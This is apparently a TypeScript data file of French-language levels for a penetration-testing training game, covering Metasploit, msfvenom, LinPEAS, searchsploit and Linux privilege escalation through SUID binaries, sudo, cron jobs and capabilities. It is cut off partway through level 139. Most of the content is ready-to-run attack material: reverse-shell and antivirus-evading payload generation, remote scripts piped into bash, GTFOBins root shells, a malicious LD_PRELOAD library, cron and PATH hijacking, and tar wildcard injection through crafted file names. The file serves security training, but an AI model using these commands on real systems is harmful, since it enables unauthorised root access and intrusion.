import type { Level } from './_types';

export const levels131_140: Level[] = [
  {
    id: 131,
    title: "msfconsole — Introduction à Metasploit",
    difficulty: 'advanced',
    category: "Metasploit",
    objective: "Naviguer dans Metasploit Framework et comprendre sa structure",
    description: "`msfconsole` est l'interface principale de Metasploit Framework, l'outil de référence en pentest offensif. Le framework est organisé en modules : `exploits` (code d'attaque), `auxiliary` (scan/énumération), `payloads` (code exécuté sur la cible), `post` (actions post-exploitation), `encoders` (obfuscation). Tape `help` pour voir toutes les commandes disponibles, `show exploits` pour lister les exploits, et `db_nmap` pour scanner tout en sauvegardant les résultats dans la base de données intégrée.",
    commands: ['msfconsole'],
    hints: [
      "Lance msfconsole puis tape `help` pour voir les commandes — `show modules` liste les types disponibles",
      "Utilise `workspace -a pentest1` pour créer un espace de travail isolé, puis `db_nmap -sV 192.168.1.0/24` pour scanner",
      "Tape `show exploits | grep linux` pour filtrer les exploits Linux, ou `search type:exploit platform:linux` pour une recherche avancée"
    ],
    fileSystem: {
      'metasploit_structure.txt': `Structure des modules Metasploit
=================================

1. EXPLOITS
   Chemin : exploit/[plateforme]/[service]/[nom]
   Exemple : exploit/linux/http/apache_mod_cgi_bash_env
   Usage   : code qui déclenche une vulnérabilité

2. AUXILIARY
   Chemin : auxiliary/[type]/[service]/[nom]
   Exemples :
     auxiliary/scanner/ssh/ssh_login     → bruteforce SSH
     auxiliary/scanner/http/http_version → fingerprinting
     auxiliary/dos/tcp/synflood          → déni de service

3. PAYLOADS
   Types :
     singles   → payload autonome (shell_reverse_tcp)
     stagers   → établit la connexion (stage 1)
     stages    → fonctionnalités complètes (Meterpreter)
   Exemples :
     linux/x86/meterpreter/reverse_tcp
     windows/x64/meterpreter_reverse_https
     cmd/unix/reverse_bash

4. POST
   Chemin : post/[plateforme]/[catégorie]/[nom]
   Exemples :
     post/linux/gather/hashdump
     post/multi/recon/local_exploit_suggester

5. ENCODERS
   Usage : obfusquer un payload pour éviter l'AV
   Exemples :
     encoder/x86/shikata_ga_nai   (très utilisé)
     encoder/x64/xor_dynamic

6. EVASION
   Modules dédiés à contourner les antivirus et EDR`,

      'msfconsole_commands.txt': `Commandes essentielles msfconsole
===================================

NAVIGATION
  help                    → liste toutes les commandes
  show [type]             → affiche modules (exploits, payloads, etc.)
  search [terme]          → recherche dans les modules
  use [module]            → sélectionner un module
  back                    → quitter le module actif
  info                    → détails sur le module sélectionné

CONFIGURATION
  show options            → paramètres du module
  set [OPTION] [valeur]   → définir une option
  setg [OPTION] [valeur]  → définir globalement
  unset [OPTION]          → effacer une option

EXÉCUTION
  run / exploit           → lancer le module
  check                   → vérifier si la cible est vulnérable (si dispo)
  jobs                    → voir les modules en arrière-plan
  sessions                → lister les sessions actives
  sessions -i [id]        → interagir avec une session

BASE DE DONNÉES
  db_nmap [options] [cible] → scan nmap sauvegardé en DB
  hosts                   → liste les hôtes découverts
  services                → liste les services découverts
  workspace               → gestion des espaces de travail
  workspace -a [nom]      → créer un workspace
  workspace -d [nom]      → supprimer un workspace

UTILITAIRES
  msfvenom                → générer des payloads standalone
  load [plugin]           → charger un plugin (ex: load mimikatz)
  history                 → historique des commandes
  spool [fichier]         → sauvegarder la session dans un fichier`
    },
    validation: [
      { type: 'command', value: 'msfconsole', description: 'Lancer msfconsole' }
    ],
    story: "🗡️ Metasploit est le couteau suisse de l'exploitation. Développé par Rapid7, il contient plus de 2 000 modules d'exploit, des milliers de payloads, et une interface unifiée pour toute la chaîne d'attaque. Apprendre Metasploit, c'est apprendre à penser comme un attaquant structuré."
  },

  {
    id: 132,
    title: "search / use / info — Workflow Metasploit",
    difficulty: 'advanced',
    category: "Metasploit",
    objective: "Rechercher, sélectionner et configurer un module Metasploit",
    description: "Le workflow standard Metasploit suit toujours la même logique : `search type:exploit platform:linux` pour trouver un module, `use exploit/linux/...` pour le sélectionner, `info` pour lire sa documentation complète, `show options` pour voir les paramètres requis, puis `set RHOSTS`, `set LHOST`, `set LPORT` et enfin `run`. Maîtriser ce workflow te permet d'enchaîner rapidement sur n'importe quelle cible. Le champ `Rank` (excellent > great > good > normal > average > low) indique la fiabilité de l'exploit.",
    commands: ['msfconsole'],
    hints: [
      "Dans msfconsole : `search type:exploit platform:linux name:vsftpd` — le rang `excellent` signifie stable et sans crash",
      "Après `use exploit/unix/ftp/vsftpd_234_backdoor`, tape `info` pour lire les références CVE et les conditions requises",
      "Tape `show options` pour voir REQUIRED vs optionnel — `set RHOSTS 192.168.1.10` puis `set LHOST tun0` (ton IP VPN) avant `run`"
    ],
    fileSystem: {
      'workflow_guide.txt': `Workflow complet Metasploit
============================

ÉTAPE 1 — Recherche de module
  msf6 > search type:exploit platform:linux
  msf6 > search cve:2021-4034
  msf6 > search name:samba rank:excellent

  Colonnes résultat :
    #    → index du module
    Name → chemin complet
    Date → date de publication
    Rank → fiabilité (excellent = le mieux)
    Check → supporte la vérification sans exploit
    Description → résumé

ÉTAPE 2 — Sélection et info
  msf6 > use 0                   (par index)
  msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
  msf6 exploit(vsftpd_234_backdoor) > info

  Infos importantes dans info :
    - Description détaillée
    - References (CVE, BID, EDB)
    - Targets supportées
    - Required options

ÉTAPE 3 — Configuration
  msf6 > show options
  msf6 > set RHOSTS 192.168.1.10
  msf6 > set RPORT 21
  msf6 > set LHOST 192.168.1.5    (ton IP)
  msf6 > set LPORT 4444
  msf6 > set PAYLOAD linux/x86/meterpreter/reverse_tcp

ÉTAPE 4 — Exécution
  msf6 > check        (vérifier sans exploiter si supporté)
  msf6 > run          (lancer l'exploit)
  msf6 > exploit -j   (lancer en arrière-plan)

ÉTAPE 5 — Post-exploitation
  msf6 > sessions -l             (lister sessions)
  msf6 > sessions -i 1           (rejoindre session 1)
  meterpreter > sysinfo
  meterpreter > getuid
  meterpreter > getsystem        (tentative privesc auto)`,

      'exploit_selection_tutorial.txt': `Exemple concret : exploitation vsftpd 2.3.4
==========================================

Contexte :
  - Scan nmap révèle : 21/tcp open ftp vsftpd 2.3.4
  - Cette version contient une backdoor introduite en 2011

Dans msfconsole :
  msf6 > search vsftpd
  [résultat]
    0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03  excellent  No

  msf6 > use 0
  msf6 exploit(vsftpd_234_backdoor) > show options

  Module options :
    RHOSTS → IP de la cible (REQUIRED)
    RPORT  → 21 (défaut OK)

  msf6 > set RHOSTS 192.168.1.10
  msf6 > run

  [*] Banner: 220 (vsFTPd 2.3.4)
  [+] 192.168.1.10:21 - Backdoor service has been spawned
  [+] 192.168.1.10:21 - UID: uid=0(root)
  [*] Command shell session 1 opened

Résultat : shell root direct, pas de payload requis

Leçon : certains exploits excellent n'ont pas besoin
de LHOST/LPORT car ils déclenchent un bind shell
côté cible.`
    },
    validation: [
      { type: 'command', value: 'msfconsole', description: 'Utiliser le workflow search/use/run' }
    ],
    story: "🎯 La vraie compétence Metasploit n'est pas de savoir lancer des exploits — c'est de savoir chercher rapidement le bon module, lire sa documentation, configurer correctement les options, et adapter le payload à la cible. La vitesse d'exécution vient avec la pratique du workflow."
  },

  {
    id: 133,
    title: "msfvenom — Génération de payloads",
    difficulty: 'advanced',
    category: "Metasploit",
    objective: "Créer des payloads malveillants avec msfvenom",
    description: "`msfvenom` génère des payloads standalone (sans msfconsole actif) pour toutes les plateformes. L'option `-p` choisit le payload, `-f` le format de sortie (elf, exe, php, python, raw…), `-o` le fichier de sortie, `LHOST` et `LPORT` définissent où le reverse shell se connecte. Les options `-e` (encoder) et `-i` (iterations) aident à contourner les antivirus basiques, bien que les AV modernes nécessitent des techniques plus avancées.",
    commands: ['msfvenom'],
    hints: [
      "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f elf -o shell.elf",
      "msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.1.5 LPORT=443 -f exe -e x86/shikata_ga_nai -i 5 -o payload.exe",
      "msfvenom --list payloads | grep linux/x64 pour voir les payloads disponibles — singles vs stagers"
    ],
    fileSystem: {
      'payload_types.txt': `Types de payloads msfvenom
===========================

LINUX
  linux/x86/shell_reverse_tcp         → reverse shell simple 32-bit
  linux/x64/shell_reverse_tcp         → reverse shell simple 64-bit
  linux/x86/meterpreter/reverse_tcp   → Meterpreter stagé 32-bit
  linux/x64/meterpreter/reverse_tcp   → Meterpreter stagé 64-bit
  linux/x64/meterpreter_reverse_tcp   → Meterpreter stageless 64-bit

WINDOWS
  windows/shell_reverse_tcp           → cmd.exe reverse 32-bit
  windows/x64/shell_reverse_tcp       → cmd.exe reverse 64-bit
  windows/meterpreter/reverse_tcp     → Meterpreter stagé 32-bit
  windows/x64/meterpreter/reverse_tcp → Meterpreter stagé 64-bit
  windows/x64/meterpreter_reverse_https → Meterpreter HTTPS (plus discret)

WEB
  php/meterpreter_reverse_tcp         → payload PHP (webshell)
  java/meterpreter/reverse_tcp        → payload Java (WAR/JAR)
  python/meterpreter/reverse_tcp      → payload Python

DIFFÉRENCE stagé vs stageless :
  stagé    : petit loader (stager) qui télécharge le vrai payload
             Notation : linux/x64/meterpreter/reverse_tcp  (slash = stagé)
  stageless: payload complet intégré dans le fichier
             Notation : linux/x64/meterpreter_reverse_tcp  (underscore = stageless)
  → stageless est plus grand mais fonctionne sans handler Metasploit actif`,

      'msfvenom_examples.txt': `Exemples msfvenom par use-case
================================

1. REVERSE SHELL LINUX (ELF)
   msfvenom -p linux/x64/meterpreter/reverse_tcp \\
     LHOST=10.10.14.5 LPORT=4444 -f elf -o rev.elf
   chmod +x rev.elf && ./rev.elf

2. REVERSE SHELL WINDOWS (EXE)
   msfvenom -p windows/x64/meterpreter/reverse_tcp \\
     LHOST=10.10.14.5 LPORT=4444 -f exe -o payload.exe

3. WEBSHELL PHP
   msfvenom -p php/meterpreter_reverse_tcp \\
     LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.php

4. PAYLOAD AVEC ENCODEUR (AV bypass basique)
   msfvenom -p windows/meterpreter/reverse_tcp \\
     LHOST=10.10.14.5 LPORT=4444 \\
     -e x86/shikata_ga_nai -i 10 -f exe -o encoded.exe

5. HANDLER (recevoir la connexion dans msfconsole)
   msf6 > use exploit/multi/handler
   msf6 > set PAYLOAD linux/x64/meterpreter/reverse_tcp
   msf6 > set LHOST 0.0.0.0
   msf6 > set LPORT 4444
   msf6 > run -j

6. LISTER LES FORMATS
   msfvenom --list formats
   msfvenom --list encoders
   msfvenom --list payloads | grep -i linux`
    },
    validation: [
      { type: 'command', value: 'msfvenom', description: 'Générer un payload avec msfvenom' }
    ],
    story: "💣 msfvenom est la forge à payloads : ELF pour Linux, EXE pour Windows, PHP pour les webshells, Python pour les scripts. Chaque contexte d'attaque a son format. La maîtrise de msfvenom te permet de générer exactement ce dont tu as besoin, au bon format, avec le bon transport."
  },

  {
    id: 134,
    title: "linpeas — Enumération post-exploit Linux",
    difficulty: 'advanced',
    category: "Privilege Escalation",
    objective: "Enumérer les vecteurs de privesc avec LinPEAS",
    description: "LinPEAS (Linux Privilege Escalation Awesome Script) est un script shell qui automatise l'énumération de tous les vecteurs d'élévation de privilèges sur un système Linux. Il code ses résultats par couleur : rouge/jaune = critique (exploitable 95%+ du temps), jaune = intéressant, bleu = information. Il analyse les binaires SUID/GUID, les droits sudo, les cron jobs, les capabilities, les services vulnérables, les fichiers world-writable, les mots de passe dans les configs, et bien plus. Le script peut être téléchargé et exécuté en mémoire avec `curl | bash` pour éviter d'écrire sur le disque.",
    commands: ['bash', 'curl'],
    hints: [
      "Télécharge et exécute directement en mémoire : `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash`",
      "Analyse les sections en rouge/jaune d'abord : SUID, sudo -l, cron jobs world-writable, capabilities — ce sont les vecteurs les plus courants",
      "Redirige la sortie vers un fichier pour analyse : `./linpeas.sh | tee linpeas_output.txt` puis cherche les lignes en rouge avec `grep -a '95%\\|99%' linpeas_output.txt`"
    ],
    fileSystem: {
      'linpeas_output_extract.txt': `LinPEAS Output — Extraits annotés
===================================

[couleur rouge = exploitable 95%+]

╔══════════╣ Sudo version
sudo version 1.8.21p2
  → CVE-2021-3156 (Baron Samedit) : sudo < 1.9.5p2
    Heap-based buffer overflow → root sans mot de passe !

╔══════════╣ SUID binaries
-rwsr-xr-x root  /usr/bin/find
  → GTFOBins: find . -exec /bin/sh -p \; → shell root

-rwsr-xr-x root  /usr/bin/python3.8
  → GTFOBins: python3 -c 'import os; os.execl("/bin/sh","sh","-p")'

╔══════════╣ Cron jobs
* * * * * root /opt/scripts/backup.sh
  → backup.sh appartient à www-data (world-writable !)
  → injecte une commande dans backup.sh → exécutée par root

╔══════════╣ Capabilities
/usr/bin/python3.8 = cap_setuid+ep
  → python3 -c "import os; os.setuid(0); os.system('/bin/bash')"

╔══════════╣ Writable /etc/passwd
-rw-rw-rw- /etc/passwd
  → ajoute un utilisateur root : hacker:hashed_pass:0:0:root:/root:/bin/bash
  → openssl passwd -1 -salt xyz monpassword → génère le hash`,

      'privesc_checklist.txt': `Checklist Privesc Linux
========================

AUTOMATIQUE (lancer en premier)
  [ ] LinPEAS : curl -L https://linpeas.sh | bash
  [ ] LinEnum : bash linenum.sh
  [ ] linux-exploit-suggester : ./linux-exploit-suggester.sh

KERNEL
  [ ] uname -a → version du noyau
  [ ] searchsploit linux kernel [version]
  [ ] DirtyCow (CVE-2016-5195) si < 4.8.3

SUDO
  [ ] sudo -l (droits sudo sans mot de passe ?)
  [ ] GTFOBins pour chaque binaire listé
  [ ] LD_PRELOAD dans sudoers ?

SUID/SGID
  [ ] find / -perm -4000 2>/dev/null
  [ ] Vérifier chaque binaire sur GTFOBins

CRON
  [ ] crontab -l
  [ ] cat /etc/cron* /var/spool/cron/crontabs/*
  [ ] Scripts appelés par root world-writable ?
  [ ] PATH dans crontab hijackable ?

CAPABILITIES
  [ ] getcap -r / 2>/dev/null
  [ ] cap_setuid, cap_dac_override, cap_net_raw = dangereux

CONFIGS & MOTS DE PASSE
  [ ] find / -name "*.conf" -readable 2>/dev/null
  [ ] grep -r "password" /var/www/ /etc/ 2>/dev/null
  [ ] cat ~/.bash_history (commandes avec mots de passe ?)
  [ ] Fichiers .ssh/ lisibles ?

NFS
  [ ] cat /etc/exports (no_root_squash = critique !)`
    },
    validation: [
      { type: 'command', value: 'bash', description: 'Exécuter linpeas.sh' },
      { type: 'command', value: 'curl', description: 'Télécharger linpeas' }
    ],
    story: "🔍 LinPEAS fait en 2 minutes ce qu'un pentesteur expérimenté ferait en 30 minutes manuellement. Il scrute chaque recoin du système à la recherche d'une mauvaise configuration, d'un binaire oublié, d'un cron job vulnérable. Les sections en rouge sont des cadeaux — il suffit de savoir les lire."
  },

  {
    id: 135,
    title: "searchsploit — Exploits locaux",
    difficulty: 'intermediate',
    category: "Privilege Escalation",
    objective: "Chercher des exploits dans la base Exploit-DB avec searchsploit",
    description: "`searchsploit` est l'interface en ligne de commande vers Exploit-DB, la plus grande base de données d'exploits publics. Il fonctionne offline avec une copie locale de la base. `searchsploit apache 2.4.29` cherche tous les exploits pour Apache 2.4.29, `searchsploit -m EDB-ID` copie l'exploit dans le répertoire courant pour modification, et `searchsploit --cve CVE-2021-4034` recherche par numéro CVE. C'est l'outil de référence après avoir identifié les versions logicielles sur une cible.",
    commands: ['searchsploit'],
    hints: [
      "searchsploit vsftpd 2.3.4 — compare avec `uname -a` et les versions trouvées par nmap pour chercher les exploits pertinents",
      "searchsploit -m 49521 pour copier l'exploit #49521 dans ton dossier — examine le code avant de l'exécuter !",
      "searchsploit --cve CVE-2021-4034 (PwnKit) — utilise `searchsploit -x EDB-ID` pour examiner l'exploit sans le copier"
    ],
    fileSystem: {
      'target_versions.txt': `Versions logicielles de la cible
==================================
(Résultats nmap -sV + énumération manuelle)

Système :
  OS       : Ubuntu 18.04.5 LTS
  Kernel   : Linux 4.15.0-112-generic
  Architecture : x86_64

Services :
  SSH      : OpenSSH 7.6p1
  HTTP     : Apache httpd 2.4.29
  PHP      : PHP 7.2.24
  MySQL    : MySQL 5.7.31
  FTP      : vsftpd 3.0.3
  SMTP     : Postfix 3.3.0

Applications web :
  WordPress : 5.2.4
  phpMyAdmin : 4.6.6

Commandes utiles pour identifier les versions :
  apache2 -v
  php -v
  mysql --version
  dpkg -l | grep -E 'apache|php|mysql'`,

      'searchsploit_guide.txt': `Guide searchsploit
===================

RECHERCHE BASIQUE
  searchsploit apache 2.4.29
  searchsploit wordpress 5.2
  searchsploit openssh 7.6

FILTRER PAR TYPE
  searchsploit --type local apache    → exploits locaux seulement
  searchsploit --type remote apache   → exploits distants
  searchsploit --type webapps wp      → applications web

RECHERCHE PAR CVE
  searchsploit --cve CVE-2021-4034    → PwnKit (polkit)
  searchsploit --cve CVE-2016-5195    → DirtyCow
  searchsploit --cve CVE-2019-14287   → sudo bypass

TRAVAILLER AVEC UN EXPLOIT
  searchsploit -x 49521               → examiner (lecture seule)
  searchsploit -m 49521               → copier dans le dossier courant
  searchsploit -p 49521               → afficher le chemin complet

METTRE À JOUR LA BASE
  searchsploit -u                     → mise à jour depuis Exploit-DB

ASTUCE — Supprimer les faux positifs
  searchsploit apache | grep -v "dos\|DoS"
  → filtre les exploits de déni de service si tu veux que du RCE

CHEMIN LOCAL DES EXPLOITS
  /usr/share/exploitdb/exploits/
  ls /usr/share/exploitdb/exploits/linux/local/ | head -20`
    },
    validation: [
      { type: 'command', value: 'searchsploit', description: 'Rechercher des exploits avec searchsploit' }
    ],
    story: "📚 Exploit-DB est la mémoire collective de 20 ans de vulnérabilités publiques. Quand nmap te donne une version Apache 2.4.29, searchsploit te dit instantanément si quelqu'un a déjà publié un exploit. C'est le catalogue de la faiblesse des logiciels mal maintenus."
  },

  {
    id: 136,
    title: "SUID — Exploitation des binaires SUID",
    difficulty: 'advanced',
    category: "Privilege Escalation",
    objective: "Trouver et exploiter des binaires SUID pour l'élévation de privilèges",
    description: "Un binaire SUID (Set User ID) s'exécute avec les privilèges de son propriétaire, pas de l'utilisateur qui le lance. Si root possède un binaire SUID, il s'exécute en tant que root même lancé par www-data. `find / -perm -4000 2>/dev/null` liste tous les binaires SUID du système. GTFOBins (gtfobins.github.io) recense les méthodes d'exploitation pour chaque binaire courant : find, vim, bash, python, nmap, perl, ruby, awk, cp, et bien d'autres permettent d'escalader vers root si mal configurés.",
    commands: ['find'],
    hints: [
      "find / -perm -4000 2>/dev/null pour lister tous les SUID — compare chaque résultat avec gtfobins.github.io",
      "Si `/usr/bin/find` est SUID root : `find . -exec /bin/sh -p \\;` — le `-p` conserve le UID effectif (root)",
      "Si `/usr/bin/python3` est SUID root : `python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'` donne un shell root"
    ],
    fileSystem: {
      'suid_gtfobins.txt': `Binaires SUID exploitables — GTFOBins
=======================================

FIND (SUID root)
  find . -exec /bin/sh -p \;
  → exécute /bin/sh avec EUID=0

BASH (SUID root)
  bash -p
  → bash en mode privileged, conserve EUID root

PYTHON / PYTHON3 (SUID root)
  python3 -c 'import os; os.execl("/bin/sh","sh","-p")'
  → remplace le processus par /bin/sh en root

VIM / VI (SUID root)
  vim -c ':!/bin/sh'
  → exécute une commande shell depuis vim

NMAP (SUID root, versions < 5.2)
  nmap --interactive
  nmap> !sh
  → shell interactif (anciennes versions seulement)

LESS / MORE (SUID root)
  less /etc/passwd
  !/bin/sh            → depuis l'interface less

AWK (SUID root)
  awk 'BEGIN {system("/bin/sh")}'

PERL (SUID root)
  perl -e 'exec "/bin/sh";'

RUBY (SUID root)
  ruby -e 'exec "/bin/sh"'

CP (SUID root) — technique indirecte
  cp /etc/shadow /tmp/shadow_copy
  → lire les hashes, puis cracker avec john

PASSWD (SUID root) — normal mais parfois exploitable
  openssl passwd -1 -salt xyz newpassword
  → remplacer le hash root dans /etc/passwd si writable

VÉRIFICATION
  ls -la /usr/bin/find
  -rwsr-xr-x 1 root root ... /usr/bin/find
     ^^^ le 's' = SUID activé`,

      'find_privesc.sh': `#!/bin/bash
# Script d'énumération SUID pour privesc
# Usage : bash find_privesc.sh

echo "[*] Recherche des binaires SUID..."
echo "======================================"

SUID_BINS=\$(find / -perm -4000 2>/dev/null)

echo "\$SUID_BINS" | while read -r bin; do
  echo "[SUID] \$bin"
done

echo ""
echo "[*] Binaires SUID à vérifier sur GTFOBins :"
echo "======================================"

INTERESTING=("bash" "sh" "find" "vim" "vi" "nmap" "python" "python3"
             "perl" "ruby" "awk" "less" "more" "man" "cp" "mv"
             "tee" "nano" "emacs" "node" "php" "lua")

for bin_name in "\${INTERESTING[@]}"; do
  result=\$(echo "\$SUID_BINS" | grep -i "/\$bin_name\$")
  if [ -n "\$result" ]; then
    echo "[!] TROUVÉ : \$result"
    echo "    → Vérifier sur https://gtfobins.github.io/gtfobins/\$bin_name/#suid"
  fi
done

echo ""
echo "[*] Recherche SGID..."
find / -perm -2000 2>/dev/null | head -20`
    },
    validation: [
      { type: 'command', value: 'find', description: 'Lister les binaires SUID' }
    ],
    story: "🔑 Les binaires SUID sont des clés cachées dans le système. Un administrateur qui installe nmap avec le bit SUID pour que les utilisateurs puissent l'utiliser sans sudo vient d'offrir un escalier vers root à n'importe quel attaquant qui a un accès shell. GTFOBins recense tous ces cas."
  },

  {
    id: 137,
    title: "Sudo — Abus de droits sudo",
    difficulty: 'advanced',
    category: "Privilege Escalation",
    objective: "Exploiter les configurations sudo mal sécurisées",
    description: "`sudo -l` liste les commandes qu'un utilisateur peut exécuter avec sudo, sans nécessairement connaître le mot de passe root. Une entrée `(ALL) NOPASSWD: /usr/bin/vim` dans sudoers signifie que l'utilisateur peut lancer vim en root sans mot de passe, et donc spawn un shell root depuis vim. GTFOBins liste les techniques pour chaque binaire. La variable `LD_PRELOAD` dans une configuration sudoers avec `env_keep` permet l'injection de bibliothèque partagée pour escalader directement.",
    commands: ['sudo'],
    hints: [
      "sudo -l pour lister les droits sudo — cherche NOPASSWD ou les binaires que tu peux lancer en tant que root",
      "Si sudo autorise vim : `sudo vim -c ':!/bin/bash'` — si awk : `sudo awk 'BEGIN {system(\"/bin/bash\")}'`",
      "Si sudoers contient `env_keep += LD_PRELOAD` : crée un .so malveillant avec une fonction `_init()` qui spawne un shell, puis `sudo LD_PRELOAD=/tmp/evil.so [commande_autorisée]`"
    ],
    fileSystem: {
      'sudo_misconfigurations.txt': `Mauvaises configurations sudo courantes
=========================================

1. NOPASSWD sur binaire GTFOBins
   (ALL) NOPASSWD: /usr/bin/vim
   (ALL) NOPASSWD: /usr/bin/find
   (ALL) NOPASSWD: /usr/bin/awk
   → Exploitation directe via GTFOBins

2. NOPASSWD sur script modifiable
   (ALL) NOPASSWD: /opt/scripts/backup.sh
   → Si backup.sh est writable : ajoute /bin/bash dedans

3. Wildcard dans le chemin
   (ALL) NOPASSWD: /usr/bin/python3 /opt/*.py
   → Crée /opt/evil.py avec import os; os.system("/bin/bash")
   → sudo python3 /opt/evil.py

4. env_keep += LD_PRELOAD
   Defaults env_keep += LD_PRELOAD
   (www-data) NOPASSWD: /usr/sbin/apache2 restart
   → Injection de bibliothèque malveillante

5. Sudo ALL sans restriction
   (ALL) ALL
   → sudo su ou sudo /bin/bash (avec ou sans mdp)

6. Exécution en tant qu'autre utilisateur
   (admin) NOPASSWD: /bin/bash
   → sudo -u admin /bin/bash
   → puis escalade depuis admin si admin a plus de droits

7. sudo -u#-1 (CVE-2019-14287)
   Si sudoers utilise (ALL, !root) NOPASSWD: /bin/bash
   → sudo -u#-1 /bin/bash → bypass la restriction !root`,

      'exploit_examples.txt': `Exemples d'exploitation sudo
==============================

CAS 1 : sudo vim
  sudo -l → (ALL) NOPASSWD: /usr/bin/vim
  sudo vim
  :set shell=/bin/bash
  :shell
  → shell root

CAS 2 : sudo find
  sudo -l → (ALL) NOPASSWD: /usr/bin/find
  sudo find . -exec /bin/bash \;
  → bash root direct

CAS 3 : sudo python3
  sudo -l → (ALL) NOPASSWD: /usr/bin/python3
  sudo python3 -c 'import pty; pty.spawn("/bin/bash")'
  → bash root

CAS 4 : LD_PRELOAD
  # Crée /tmp/preload.c :
  #include <stdio.h>
  #include <sys/types.h>
  #include <stdlib.h>
  void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0,0,0);
    system("/bin/bash -p");
  }

  gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /tmp/preload.c
  sudo LD_PRELOAD=/tmp/preload.so apache2
  → bash root via injection .so

CAS 5 : CVE-2021-3156 (Baron Samedit)
  → Buffer overflow dans sudo < 1.9.5p2
  → Aucun droit sudo requis !
  git clone https://github.com/blasty/CVE-2021-3156
  make && ./sudo-hax-me-a-sandwich`
    },
    validation: [
      { type: 'command', value: 'sudo', description: 'Lister et exploiter les droits sudo' }
    ],
    story: "⚠️ sudo est censé sécuriser l'accès root, mais une configuration bâclée le transforme en escalier direct. Des milliers de serveurs en production ont des entrées NOPASSWD sur des binaires GTFOBins. `sudo -l` est toujours la première commande à taper après avoir obtenu un shell."
  },

  {
    id: 138,
    title: "Cron jobs — Exploitation des tâches planifiées",
    difficulty: 'advanced',
    category: "Privilege Escalation",
    objective: "Exploiter des cron jobs mal configurés pour l'élévation de privilèges",
    description: "Les cron jobs sont des tâches planifiées qui s'exécutent automatiquement à intervalles réguliers. Si root planifie l'exécution d'un script world-writable, n'importe quel utilisateur peut injecter du code exécuté en root. `crontab -l` liste les crons de l'utilisateur courant, `cat /etc/crontab` et `ls /etc/cron.*` montrent les crons système. Une autre technique est le PATH hijacking : si le crontab de root utilise un chemin relatif et que tu contrôles un répertoire en début de PATH, tu peux placer un exécutable malveillant.",
    commands: ['cat', 'ls', 'crontab'],
    hints: [
      "crontab -l et cat /etc/crontab et ls -la /etc/cron.d/ /etc/cron.hourly/ /etc/cron.daily/ pour lister tous les crons",
      "Si un script appelé par root est world-writable : `echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /opt/vuln_script.sh` — attends l'exécution puis `/tmp/bash -p`",
      "Vérifie le PATH dans /etc/crontab — si PATH=/usr/local/sbin:/usr/local/bin et qu'un cron appelle juste `backup` sans chemin absolu, crée /usr/local/bin/backup avec ton payload"
    ],
    fileSystem: {
      'cron_privesc_scenarios.txt': `Scénarios d'exploitation Cron
================================

SCÉNARIO 1 — Script world-writable
-----------------------------------
/etc/crontab :
  * * * * * root /opt/scripts/cleanup.sh

Vérification :
  ls -la /opt/scripts/cleanup.sh
  -rwxrwxrwx 1 root root 50 /opt/scripts/cleanup.sh
  ← world-writable !

Exploitation :
  echo 'cp /bin/bash /tmp/bash_priv; chmod 4755 /tmp/bash_priv' >> /opt/scripts/cleanup.sh
  # Attendre 1 minute (cron * * * * *)
  /tmp/bash_priv -p
  # bash-5.0# whoami → root

SCÉNARIO 2 — PATH hijacking
-----------------------------
/etc/crontab :
  PATH=/usr/local/bin:/usr/bin:/bin
  * * * * * root antivirus_scan

Le binaire \`antivirus_scan\` n'existe pas dans PATH !

Exploitation :
  cat > /usr/local/bin/antivirus_scan << 'EOF'
  #!/bin/bash
  cp /bin/bash /tmp/r00t; chmod 4755 /tmp/r00t
  EOF
  chmod +x /usr/local/bin/antivirus_scan
  # Attendre 1 minute
  /tmp/r00t -p

SCÉNARIO 3 — Wildcard injection
---------------------------------
/etc/crontab :
  * * * * * root tar czf /backup/all.tar.gz /var/www/*

Le wildcard * est expansé par le shell AVANT tar !
On peut injecter des arguments tar via des noms de fichiers.

Exploitation dans /var/www :
  echo "" > "--checkpoint=1"
  echo "" > "--checkpoint-action=exec=sh shell.sh"
  cat > shell.sh << 'EOF'
  #!/bin/bash
  cp /bin/bash /tmp/r00t; chmod 4755 /tmp/r00t
  EOF
  chmod +x shell.sh
  # tar va exécuter shell.sh via --checkpoint-action`,

      'vulnerable_crontab': `# /etc/crontab — EXEMPLE VULNÉRABLE (à des fins éducatives)
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )

# Tâche de backup vulnérable (script world-writable)
* * * * *   root    /opt/scripts/backup.sh

# Tâche sans chemin absolu (PATH hijacking possible)
*/5 * * * * root    cleanup_logs

# Tâche avec wildcard (wildcard injection possible)
0 2 * * *   root    tar czf /backup/web.tar.gz /var/www/html/*`
    },
    validation: [
      { type: 'command', value: 'crontab', description: 'Lister les cron jobs' },
      { type: 'command', value: 'cat', description: 'Lire /etc/crontab' }
    ],
    story: "⏰ Les cron jobs s'exécutent en silence, toutes les minutes, toutes les heures. Un script de backup qui tourne en root chaque nuit avec des permissions world-writable est une porte dérobée permanente qui attend juste qu'on l'utilise. L'attaquant patient gagne toujours."
  },

  {
    id: 139,
    title: "Capabilities Linux",
    difficulty: 'advanced',
    category: "Privilege Escalation",
    objective: "Identifier et exploiter les capabilities Linux pour l'élévation de privilèges",
    description: "Les capabilities Linux permettent d'accorder des privilèges spécifiques à des binaires sans les rendre SUID root complets. Elles offrent une granularité fine, mais certaines capabilities sont dangereuses si mal attribuées. `getcap -r / 2>/dev/null` liste récursivement tous les binaires avec capabilities. `cap_setuid` permet de changer l'UID (escalade root directe), `cap_dac_override` bypasse les permissions de fichiers, `cap_net_raw` permet de sniffer le réseau, `cap_sys_ptrace` permet d'injecter du code dans n'importe quel processus.",
    commands: ['getcap'],
    hints: [
      "getcap -r / 2>/dev/null pour lister tous les binaires avec capabilities — cherche cap_setuid+ep ou cap_dac_override+ep",
      "Si python3 a cap_setuid : `python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'` — setuid(0) passe en root sans SUID",
